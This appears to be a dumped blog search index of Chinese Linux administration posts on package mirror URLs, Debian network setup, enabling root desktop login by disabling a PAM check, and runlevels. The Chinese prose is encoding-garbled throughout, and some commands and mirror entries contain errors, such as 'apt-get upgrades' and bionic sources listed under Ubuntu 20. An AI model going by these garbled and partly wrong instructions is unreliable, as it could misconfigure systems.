class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å››ã€æ›´æ–°æ“ä½œ"><a href="#å››ã€æ›´æ–°æ“ä½œ" class="headerlink" title="å››ã€æ›´æ–°æ“ä½œ"></a>å››ã€æ›´æ–°æ“ä½œ</h2><ol><li>RedHat ç³»åˆ—</li></ol><pre class="line-numbers language-bash"><code class="language-bash">yum clean allyum makecache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>Debian ç³»åˆ—</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">apt-get</span> update<span class="token function">apt-get</span> upgrades<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="äº”ã€RedHat-ç³»åˆ—"><a href="#äº”ã€RedHat-ç³»åˆ—" class="headerlink" title="äº”ã€RedHat ç³»åˆ—"></a>äº”ã€RedHat ç³»åˆ—</h2><h3 id="1-CentOS-6"><a href="#1-CentOS-6" class="headerlink" title="1. CentOS 6"></a>1. CentOS 6</h3><p>é˜¿é‡Œæº</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-6.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç½‘æ˜“æº</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O CentOS-Base.repo http://mirrors.163.com/.help/CentOS6-Base-163.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸­ç§‘å¤§æº</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O CentOS-Base.repo https://lug.ustc.edu.cn/wiki/_export/code/mirrors/help/centos?codeblock<span class="token operator">=</span>2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-CentOS-7"><a href="#2-CentOS-7" class="headerlink" title="2. CentOS 7"></a>2. CentOS 7</h3><p>é˜¿é‡Œæº</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç½‘æ˜“æº</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O CentOS-Base.repo http://mirrors.163.com/.help/CentOS7-Base-163.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸­ç§‘å¤§æº</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># CentOS-Base.repo</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># The mirror system uses the connecting IP address of the client and the</span><span class="token comment" spellcheck="true"># update status of each mirror to pick mirrors that are updated to and</span><span class="token comment" spellcheck="true"># geographically close to the client.  You should use this for CentOS updates</span><span class="token comment" spellcheck="true"># unless you are manually picking other mirrors.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># If the mirrorlist= does not work for you, as a fall back you can try the</span><span class="token comment" spellcheck="true"># remarked out baseurl= line instead.</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token punctuation">[</span>base<span class="token punctuation">]</span>name<span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Base<span class="token comment" spellcheck="true">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=os&amp;infra=$infra</span>baseurl<span class="token operator">=</span>https://mirrors.ustc.edu.cn/centos/<span class="token variable">$releasever</span>/os/<span class="token variable">$basearch</span>/gpgcheck<span class="token operator">=</span>1gpgkey<span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<span class="token comment" spellcheck="true">#released updates</span><span class="token punctuation">[</span>updates<span class="token punctuation">]</span>name<span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Updates<span class="token comment" spellcheck="true">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=updates&amp;infra=$infra</span>baseurl<span class="token operator">=</span>https://mirrors.ustc.edu.cn/centos/<span class="token variable">$releasever</span>/updates/<span class="token variable">$basearch</span>/gpgcheck<span class="token operator">=</span>1gpgkey<span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<span class="token comment" spellcheck="true">#additional packages that may be useful</span><span class="token punctuation">[</span>extras<span class="token punctuation">]</span>name<span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Extras<span class="token comment" spellcheck="true">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=extras&amp;infra=$infra</span>baseurl<span class="token operator">=</span>https://mirrors.ustc.edu.cn/centos/<span class="token variable">$releasever</span>/extras/<span class="token variable">$basearch</span>/gpgcheck<span class="token operator">=</span>1gpgkey<span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<span class="token comment" spellcheck="true">#additional packages that extend functionality of existing packages</span><span class="token punctuation">[</span>centosplus<span class="token punctuation">]</span>name<span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Plus<span class="token comment" spellcheck="true">#mirrorlist=http://mirrorlist.centos.org/?release=$releasever&amp;arch=$basearch&amp;repo=centosplus&amp;infra=$infra</span>baseurl<span class="token operator">=</span>https://mirrors.ustc.edu.cn/centos/<span class="token variable">$releasever</span>/centosplus/<span class="token variable">$basearch</span>/gpgcheck<span class="token operator">=</span>1enabled<span class="token operator">=</span>0gpgkey<span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-CentOS-8"><a href="#3-CentOS-8" class="headerlink" title="3. CentOS 8"></a>3. CentOS 8</h3><p>é˜¿é‡Œæº</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-8.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å…­ã€Debian-ç³»åˆ—"><a href="#å…­ã€Debian-ç³»åˆ—" class="headerlink" title="å…­ã€Debian ç³»åˆ—"></a>å…­ã€Debian ç³»åˆ—</h2><h3 id="1-Debian-7"><a href="#1-Debian-7" class="headerlink" title="1. Debian 7"></a>1. Debian 7</h3><p>é˜¿é‡Œæº</p><pre><code>deb http://mirrors.aliyun.com/debian/ wheezy main non-free contribdeb http://mirrors.aliyun.com/debian/ wheezy-proposed-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ wheezy main non-free contribdeb-src http://mirrors.aliyun.com/debian/ wheezy-proposed-updates main non-free contrib</code></pre><h3 id="2-Debian-8"><a href="#2-Debian-8" class="headerlink" title="2. Debian 8"></a>2. Debian 8</h3><p>é˜¿é‡Œæº</p><pre><code>deb http://mirrors.aliyun.com/debian/ jessie main non-free contribdeb http://mirrors.aliyun.com/debian/ jessie-proposed-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ jessie main non-free contribdeb-src http://mirrors.aliyun.com/debian/ jessie-proposed-updates main non-free contrib</code></pre><h3 id="3-Debian-9"><a href="#3-Debian-9" class="headerlink" title="3. Debian 9"></a>3. Debian 9</h3><p>é˜¿é‡Œæº</p><pre><code>deb http://mirrors.aliyun.com/debian/ stretch main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch main non-free contribdeb http://mirrors.aliyun.com/debian-security stretch/updates maindeb-src http://mirrors.aliyun.com/debian-security stretch/updates maindeb http://mirrors.aliyun.com/debian/ stretch-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ stretch-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian/ stretch-backports main non-free contrib</code></pre><h3 id="4-Debian-10"><a href="#4-Debian-10" class="headerlink" title="4. Debian 10"></a>4. Debian 10</h3><p>é˜¿é‡Œæº</p><pre><code>deb http://mirrors.aliyun.com/debian/ buster main non-free contribdeb http://mirrors.aliyun.com/debian-security buster/updates maindeb http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb http://mirrors.aliyun.com/debian/ buster-backports main non-free contribdeb-src http://mirrors.aliyun.com/debian-security buster/updates maindeb-src http://mirrors.aliyun.com/debian/ buster main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-updates main non-free contribdeb-src http://mirrors.aliyun.com/debian/ buster-backports main non-free contrib</code></pre><p>ä¸­ç§‘å¤§</p><pre class="line-numbers language-bash"><code class="language-bash">deb http://mirrors.ustc.edu.cn/debian stable main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian stable main contrib non-freedeb http://mirrors.ustc.edu.cn/debian stable-updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian stable-updates main contrib non-freedeb http://mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-Ubuntu-16"><a href="#5-Ubuntu-16" class="headerlink" title="5. Ubuntu 16"></a>5. Ubuntu 16</h3><p>é˜¿é‡Œæº</p><pre class="line-numbers language-bash"><code class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ xenial maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial maindeb http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates maindeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security maindeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-Ubuntu-18"><a href="#6-Ubuntu-18" class="headerlink" title="6. Ubuntu 18"></a>6. Ubuntu 18</h3><p>é˜¿é‡Œæº</p><pre class="line-numbers language-bash"><code class="language-bash">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="7-Ubuntu-20"><a href="#7-Ubuntu-20" class="headerlink" title="7. Ubuntu 20"></a>7. Ubuntu 20</h3><p>é˜¿é‡Œæº</p><pre><code>deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse</code></pre><p>ä¸­ç§‘å¤§æº</p><pre><code>deb https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-backports main restricted universe multiverse# é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨# deb https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse# deb-src https://mirrors.ustc.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse</code></pre><p>ç½‘æ˜“æº</p><pre><code>deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse</code></pre><p>æ¸…åæº</p><pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</code></pre><h3 id="8-Kali-Linux"><a href="#8-Kali-Linux" class="headerlink" title="8. Kali Linux"></a>8. Kali Linux</h3><p>é˜¿é‡Œæº</p><pre class="line-numbers language-bash"><code class="language-bash">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸­ç§‘å¤§æº</p><pre><code>deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre><h3 id="9-Parrot-OS"><a href="#9-Parrot-OS" class="headerlink" title="9. Parrot OS"></a>9. Parrot OS</h3><p>æ¸…åæº</p><pre><code>deb https://mirrors.tuna.tsinghua.edu.cn/parrot/ rolling main contrib non-free</code></pre><p>ä¸­ç§‘å¤§æº</p><pre><code>deb http://mirrors.ustc.edu.cn/parrot rolling main contrib non-free</code></pre><h3 id="10-Deepin"><a href="#10-Deepin" class="headerlink" title="10. Deepin"></a>10. Deepin</h3><p>é˜¿é‡Œæº</p><pre class="line-numbers language-bash"><code class="language-bash">deb <span class="token punctuation">[</span>by-hash<span class="token operator">=</span>force<span class="token punctuation">]</span> http://mirrors.aliyun.com/deepin lion main contrib non-free<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> æ›´æ–°æº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debianç³»åˆ—-ç½‘ç»œé…ç½®</title>
      <link href="/post/e59e77a9.html"/>
      <url>/post/e59e77a9.html</url>
      
        <content type="html"><![CDATA[<h2 id="Debian-ç³»åˆ—ç³»ç»Ÿç½‘ç»œé…ç½®"><a href="#Debian-ç³»åˆ—ç³»ç»Ÿç½‘ç»œé…ç½®" class="headerlink" title="Debian ç³»åˆ—ç³»ç»Ÿç½‘ç»œé…ç½®"></a>Debian ç³»åˆ—ç³»ç»Ÿç½‘ç»œé…ç½®</h2><ol><li>Debian ç³»åˆ—ç³»ç»Ÿç½‘ç»œé…ç½®æ–‡ä»¶</li></ol><p>/etc/network/interfaces<br>â€‹</p><ol start="2"><li>é…ç½®åŠ¨æ€ IP</li></ol><p>ç¼–è¾‘ /etc/network/interfaces</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># interfaces(5) file used by ifup(8) and ifdown(8)</span>auto loiface lo inet loopbackauto ens33iface ens33 inet dhcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹</p><ol start="3"><li>é…ç½®é™æ€ IP</li></ol><p>ç¼–è¾‘ /etc/network/interfaces</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># interfaces(5) file used by ifup(8) and ifdown(8)</span>auto loiface lo inet loopbackauto ens33iface ens33 inet staticaddress 192.168.2.33gateway 192.168.2.2netmask 255.255.255.0dns-nameservers 192.168.2.2 114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹</p><ol start="4"><li>é…ç½® DNS</li></ol><p>ç¼–è¾‘ /etc/resolv.conf</p><pre class="line-numbers language-bash"><code class="language-bash">nameserver 192.168.2.33nameserver 114.114.114.114<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>â€‹</p><ol start="5"><li>å…³é—­ NetworkManager</li></ol><pre class="line-numbers language-bash"><code class="language-bash">systemctl stop NetworkManagersystemctl disable NetworkManager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="6"><li>é‡å¯ç½‘ç»œ</li></ol><pre class="line-numbers language-bash"><code class="language-bash">/etc/init.d/networking restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ç½‘ç»œé…ç½® </tag>
            
            <tag> Debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Debianç³»åˆ—-å¼€å¯rootç”¨æˆ·ç™»å½•</title>
      <link href="/post/e604aa6a.html"/>
      <url>/post/e604aa6a.html</url>
      
        <content type="html"><![CDATA[<h2 id="Debian-ç³»åˆ—-å¼€å¯-root-ç”¨æˆ·ç™»å½•"><a href="#Debian-ç³»åˆ—-å¼€å¯-root-ç”¨æˆ·ç™»å½•" class="headerlink" title="Debian ç³»åˆ—-å¼€å¯ root ç”¨æˆ·ç™»å½•"></a>Debian ç³»åˆ—-å¼€å¯ root ç”¨æˆ·ç™»å½•</h2><h3 id="1-ä½¿ç”¨æ™®é€šç”¨æˆ·ç™»å½•ç³»ç»Ÿ"><a href="#1-ä½¿ç”¨æ™®é€šç”¨æˆ·ç™»å½•ç³»ç»Ÿ" class="headerlink" title="1. ä½¿ç”¨æ™®é€šç”¨æˆ·ç™»å½•ç³»ç»Ÿ"></a>1. ä½¿ç”¨æ™®é€šç”¨æˆ·ç™»å½•ç³»ç»Ÿ</h3><h3 id="2-ä¿®æ”¹-root-å¯†ç "><a href="#2-ä¿®æ”¹-root-å¯†ç " class="headerlink" title="2. ä¿®æ”¹ root å¯†ç "></a>2. ä¿®æ”¹ root å¯†ç </h3><pre class="line-numbers language-bash"><code class="language-bash">truda@truda-virtual-machine:~$ <span class="token function">sudo</span> <span class="token function">passwd</span> rootEnter new UNIX password:Retype new UNIX password:passwd: password updated successfully<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-åˆ‡æ¢åˆ°-root-ç”¨æˆ·"><a href="#3-åˆ‡æ¢åˆ°-root-ç”¨æˆ·" class="headerlink" title="3. åˆ‡æ¢åˆ° root ç”¨æˆ·"></a>3. åˆ‡æ¢åˆ° root ç”¨æˆ·</h3><pre class="line-numbers language-bash"><code class="language-bash">truda@truda-virtual-machine:~$ <span class="token function">su</span> - rootPassword:root@truda-virtual-machine:~<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="4-ç¼–è¾‘æ–‡ä»¶ï¼ˆä»¥-Ubuntu-ä¸ºä¾‹ï¼‰"><a href="#4-ç¼–è¾‘æ–‡ä»¶ï¼ˆä»¥-Ubuntu-ä¸ºä¾‹ï¼‰" class="headerlink" title="4. ç¼–è¾‘æ–‡ä»¶ï¼ˆä»¥ Ubuntu ä¸ºä¾‹ï¼‰"></a>4. ç¼–è¾‘æ–‡ä»¶ï¼ˆä»¥ Ubuntu ä¸ºä¾‹ï¼‰</h3><p>åœ¨ /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf æ·»åŠ ä»¥ä¸‹ä¸¤è¡Œï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">greeter-show-manual-login<span class="token operator">=</span>trueall-guest<span class="token operator">=</span>false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆ†åˆ«åœ¨ /etc/pam.d/gdm-autologin å’Œ /etc/pam.d/gdm-password ä¸­æ³¨é‡Šè¿™ä¸€è¡Œï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># auth    required    pam_succeed_if.so user != root quiet_success</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®æ”¹ /root/.profile ä¸­çš„ mesg n æ”¹ä¸º tty -s &amp;&amp; mesg n<br>â€‹</p><h3 id="5-é‡å¯ç³»ç»Ÿ"><a href="#5-é‡å¯ç³»ç»Ÿ" class="headerlink" title="5. é‡å¯ç³»ç»Ÿ"></a>5. é‡å¯ç³»ç»Ÿ</h3>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxç³»ç»Ÿçš„7ä¸ªè¿è¡Œçº§åˆ«</title>
      <link href="/post/96164b95.html"/>
      <url>/post/96164b95.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-ç³»ç»Ÿçš„-7-ä¸ªè¿è¡Œçº§åˆ«"><a href="#Linux-ç³»ç»Ÿçš„-7-ä¸ªè¿è¡Œçº§åˆ«" class="headerlink" title="Linux ç³»ç»Ÿçš„ 7 ä¸ªè¿è¡Œçº§åˆ«"></a>Linux ç³»ç»Ÿçš„ 7 ä¸ªè¿è¡Œçº§åˆ«</h1><h2 id="ä¸€ã€7-ä¸ªè¿è¡Œçº§åˆ«"><a href="#ä¸€ã€7-ä¸ªè¿è¡Œçº§åˆ«" class="headerlink" title="ä¸€ã€7 ä¸ªè¿è¡Œçº§åˆ«"></a>ä¸€ã€7 ä¸ªè¿è¡Œçº§åˆ«</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/svg/519483/1626773261540-37247e7a-e11a-41ce-92a8-820ddbb0d61d.svg#clientId=u0b1258d6-5811-4&amp;from=drop&amp;id=u800e58e3&amp;margin=%5Bobject%20Object%5D&amp;name=Linux%E7%B3%BB%E7%BB%9F7%E4%B8%AA%E8%BF%90%E8%A1%8C%E7%BA%A7%E5%88%AB.svg&amp;originHeight=381&amp;originWidth=1090&amp;originalType=binary%E2%88%B6=1&amp;size=1363898&amp;status=done&amp;style=none&amp;taskId=u4e1bc000-6f80-438f-9a10-a073a87b5e4" alt="Linuxç³»ç»Ÿ7ä¸ªè¿è¡Œçº§åˆ«.svg"></p><h2 id="äºŒã€çº§åˆ«å…·ä½“è¯´æ˜"><a href="#äºŒã€çº§åˆ«å…·ä½“è¯´æ˜" class="headerlink" title="äºŒã€çº§åˆ«å…·ä½“è¯´æ˜"></a>äºŒã€çº§åˆ«å…·ä½“è¯´æ˜</h2><p>0ï¼š ç³»ç»Ÿåœæœºï¼ˆå…³æœºï¼‰æ¨¡å¼ï¼Œç³»ç»Ÿé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ç½®ä¸º 0ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨ï¼Œä¸€å¼€æœºå°±è‡ªåŠ¨å…³æœºã€‚<br>1ï¼šå•ç”¨æˆ·æ¨¡å¼ï¼Œroot æƒé™ï¼Œç”¨äºç³»ç»Ÿç»´æŠ¤ï¼Œç¦æ­¢è¿œç¨‹ç™»é™†ï¼Œå°±åƒ Windows ä¸‹çš„å®‰å…¨æ¨¡å¼ç™»å½•ã€‚<br>2ï¼šå¤šç”¨æˆ·æ¨¡å¼ï¼Œæ²¡æœ‰ NFS ç½‘ç»œæ”¯æŒã€‚<br>3ï¼šå®Œæ•´çš„å¤šç”¨æˆ·æ–‡æœ¬æ¨¡å¼ï¼Œæœ‰ NFSï¼Œç™»é™†åè¿›å…¥æ§åˆ¶å°å‘½ä»¤è¡Œæ¨¡å¼ã€‚<br>4ï¼šç³»ç»Ÿæœªä½¿ç”¨ï¼Œä¿ç•™ä¸€èˆ¬ä¸ç”¨ï¼Œåœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µä¸‹å¯ä»¥ç”¨å®ƒæ¥åšä¸€äº›äº‹æƒ…ã€‚ä¾‹å¦‚åœ¨ç¬”è®°æœ¬ç”µè„‘çš„ç”µæ± ç”¨å°½æ—¶ï¼Œå¯ä»¥åˆ‡æ¢åˆ°è¿™ä¸ªæ¨¡å¼æ¥åšä¸€äº›è®¾ç½®ã€‚<br>5ï¼šå›¾å½¢åŒ–æ¨¡å¼ï¼Œç™»é™†åè¿›å…¥å›¾å½¢ GUI æ¨¡å¼æˆ– GNOMEã€KDE å›¾å½¢åŒ–ç•Œé¢ï¼Œå¦‚ X Window ç³»ç»Ÿã€‚<br>6ï¼šé‡å¯æ¨¡å¼ï¼Œé»˜è®¤è¿è¡Œçº§åˆ«ä¸èƒ½è®¾ä¸º 6ï¼Œå¦åˆ™ä¸èƒ½æ­£å¸¸å¯åŠ¨ï¼Œå°±ä¼šä¸€ç›´å¼€æœºé‡å¯å¼€æœºé‡å¯ã€‚<br>â€‹</p><h2 id="ä¸‰ã€å¯åŠ¨åŸç†ç®€ä»‹"><a href="#ä¸‰ã€å¯åŠ¨åŸç†ç®€ä»‹" class="headerlink" title="ä¸‰ã€å¯åŠ¨åŸç†ç®€ä»‹"></a>ä¸‰ã€å¯åŠ¨åŸç†ç®€ä»‹</h2><ol><li>åœ¨ç›®å½•/etc/rc.d/init.d ä¸‹æœ‰è®¸å¤šæœåŠ¡å™¨è„šæœ¬ç¨‹åºï¼Œä¸€èˆ¬ç§°ä¸ºæœåŠ¡(service)ã€‚</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ ll /etc/rc.d/init.dtotal 36-rw-r--r--. 1 root root 15131 Sep 12  2016 functions-rwxr-xr-x. 1 root root  2989 Sep 12  2016 netconsole-rwxr-xr-x. 1 root root  6643 Sep 12  2016 network-rw-r--r--. 1 root root  1160 Sep 13  2016 